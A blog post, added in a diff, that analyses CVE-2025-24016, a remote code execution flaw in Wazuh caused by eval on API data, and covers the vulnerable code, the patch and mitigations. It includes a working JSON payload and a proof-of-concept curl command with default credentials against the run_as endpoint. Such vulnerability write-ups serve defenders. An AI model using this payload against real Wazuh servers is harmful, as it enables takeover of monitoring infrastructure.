@@ -1,0 +1,124 @@
+---
+id: 2
+title: "CVE-2025-24016: Unsafe Deserialization in Wazuh – RCE"
+date: "March 27, 2025"
+category: "vulnerability"
+tags: ["CVE", "VulnerabilityResearch", "InfoSec", "Exploits","TechnicalAnalysis"]
+author: "Hamza Khattak"
+image: "/assets/img/blog/blog_post_2_2.png"
+authorQuote: "Critical RCE Flaw in Wazuh: Unsafe Deserialization Puts Systems at Risk"
+---
+
+![CVE-2025-24016](/assets/img/blog/blog_post_2_2.png)
+# CVE-2025-2401: Unsafe Deserialization in Wazuh – RCE
+
+## Description
+Open-source Security Information and Event Management (SIEM) platform Wazuh suffers from CVE-2025-24016, which enables attackers to execute arbitrary code remotely on their servers.
+
+Attackers who have API access can execute arbitrary Python commands on vulnerable servers through this vulnerability, which exists from version 4.4.0 up to 4.9.0. The `as_wazuh_object` function processes DistributedAPI (DAPI) request or response data that makes the vulnerability active. The vulnerability enables attackers to execute arbitrary Python code, resulting in system takeover, data breaches, and complete security damage to infrastructure.
+
+The safe `ast.literal_eval` function change in version 4.9.1 enables vulnerability protection.
+Open-source Security Information and Event Management (SIEM) platform Wazuh suffers from CVE-2025-24016 which enables attackers to execute arbitrary code remotely on their servers.
+
+## Technical Breakdown
+
+- **Affected Software:** Wazuh  
+- **Affected Versions:** 4.4.0 to 4.9.0  
+- **CVSSv3.1 Score:** 9.9 (Critical)  
+- **CVSSv3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H`  
+- **Affected Component:** `framework/wazuh/core/cluster/common.py`  
+- **Attack Vector:** Network  
+- **Privileges Required:** Low (API Access)  
+- **User Interaction:** None  
+- **Scope:** Changed  
+
+The security problem resides inside the `as_wazuh_object` function within `framework/wazuh/core/cluster/common.py`. DAPI data serialization occurs through this function to process JSON data used for communication between Wazuh API, manager, and agents.
+
+Before the implementation of the security patch the vulnerable code section appeared as follows:
+
+```python
+def as_wazuh_object(dct: Dict):
+    try:
+        if '__wazuh_datetime__' in dct:
+            return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])
+        elif '__unhandled_exc__' in dct:
+            exc_data = dct['__unhandled_exc__']
+            return eval(exc_data['__class__'])(*exc_data['__args__']) # 🚨 VULNERABLE 🚨
+        return dct
+    except (KeyError, AttributeError):
+        return dct
+```
+
+The code checks if the dictionary `dct` contains the key `__unhandled_exc__`. A valid dictionary value for `__unhandled_exc__` enables the code to obtain class and args values before implementing `eval` to create an instance of `__class__` with arguments `__args__`. Evaluating untrusted data means exposing the system to severe Python code execution since attackers control it.
+
+## Affected Component Analysis
+CVE-2025-24016 occurs because `eval` operates on every data string received from the Distributed API for serialization. Evaluation functions in Python enable execution of arbitrary program code so this creates a major security threat to users.
+The vulnerability can be abused by attackers who create specific malicious JSON data including the `unhandled_exc` dictionary entry. A specifically constructed dictionary within the Python class gets passed to the `eval` function allowing server-execution of arbitrary code.
+The vulnerability appears because the `as_wazuh_object` function fails to properly clean or check incoming data before sending it to evaluation. Attackers can execute remote code by placing their own code into the `class` and `args` fields because this vulnerability allows control over these parameters.
+
+An attacker can send the following JSON payload:
+```json
+{
+    "__unhandled_exc__": {
+        "__class__": "os.system",
+        "__args__": ["touch /tmp/pwn.txt"]
+    }
+}
+```
+The execution of `eval` within `as_wazuh_object` produces a system call of `os.system("touch /tmp/pwn.txt")`, leading to the creation of a file named `/tmp/pwn.txt` on the Wazuh server.
+
+## Exploitation Techniques
+Exploiting this vulnerability requires API access, which attackers can obtain through compromised dashboards, agents, or weak credentials.
+
+A proof-of-concept (PoC) demonstrates how exploitation can be carried out via the run_as endpoint:
+```sh
+curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" \  
+--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}' \  
+https://<worker-server>:55000/security/user/authenticate/run_as
+```
+### Explanation of the Exploit:
+- **`-X POST`** – Specifies the HTTP method as **POST**.  
+- **`-k`** – Disables SSL certificate verification (useful for testing in environments with self-signed certificates).  
+- **`-u "wazuh-wui:MyS3cr37P450r.*-"`** – Provides authentication credentials (**default credentials are used here, which should be changed for security**).  
+- **`-H "Content-Type: application/json"`** – Sets the `Content-Type` header to `application/json` to indicate the request body format.  
+- **`--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}'`** – Injects the malicious JSON payload, which executes the command `touch /tmp/pwn.txt` on the Wazuh server, demonstrating arbitrary code execution.  
+- **`https://<worker-server>:55000/security/user/authenticate/run_as`** – Specifies the `run_as` endpoint URL. Replace `<worker-server>` with the actual hostname or IP address of the Wazuh worker server.  
+
+A successful attack grants the following capabilities:
+
+- **Full system control** – Attackers can install malware, modify configurations, or exfiltrate sensitive data.
+- **Lateral movement** – The compromised Wazuh server can be used for spreading across networks.
+- **Monitoring disruption** – Security alerts can be disabled, allowing attackers to operate undetected.
+
+## Patch Analysis
+Wazuh resolved this vulnerability in version 4.9.1 by replacing `eval` with `ast.literal_eval`, which securely evaluates literals without allowing arbitrary code execution.
+
+Here is the relevant code modification in `framework/wazuh/core/cluster/common.py`:
+
+```python
+        elif '__unhandled_exc__' in dct:
+            exc_data = dct['__unhandled_exc__']
+-            return eval(exc_data['__class__'])(*exc_data['__args__'])
++            exc_dict = {exc_data['__class__']: exc_data['__args__']}
++            return ast.literal_eval(json.dumps(exc_dict))
+        return dct
+```
+The patch mitigates the vulnerability by replacing the unsafe `eval` function with `ast.literal_eval`. Unlike `eval`, `ast.literal_eval` only processes Python literals, eliminating arbitrary code execution risks.
+
+## Mitigation Strategies
+To reduce the risk associated with this vulnerability, organizations should implement the following security measures:
+
+- **Upgrade to Wazuh 4.9.1 or later** – This version includes the necessary patch to fix the vulnerability.
+- **Restrict API access** – Limit API usage to only authorized users and trusted systems.
+- **Temporary workarounds** – Deploy Web Application Firewalls (WAFs) to block requests containing `__unhandled_exc__`.
+- **Monitor API traffic** – Continuously track API activity for unusual behavior, such as unexpected requests or large data transfers.
+- **Regularly update security configurations** – Ensure that Wazuh security settings are current and properly configured.
+
+## References
+- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-24016)
+- [GitHub Advisory](https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh)
+- [GitHub Repository (PoC)](https://github.com/0xjessie21/CVE-2025-24016)
+- [SonicWall Blog](https://www.sonicwall.com/blog/critical-wazuh-rce-vulnerability-cve-2025-24016-risks-exploits-and-remediation)
+- [SecurityOnline.info](https://securityonline.info/cve-2025-24016-cvss-9-9-critical-rce-vulnerability-discovered-in-wazuh-server/)
+- [Recorded Future](https://www.recordedfuture.com/vulnerability-database/CVE-2025-24016)
+
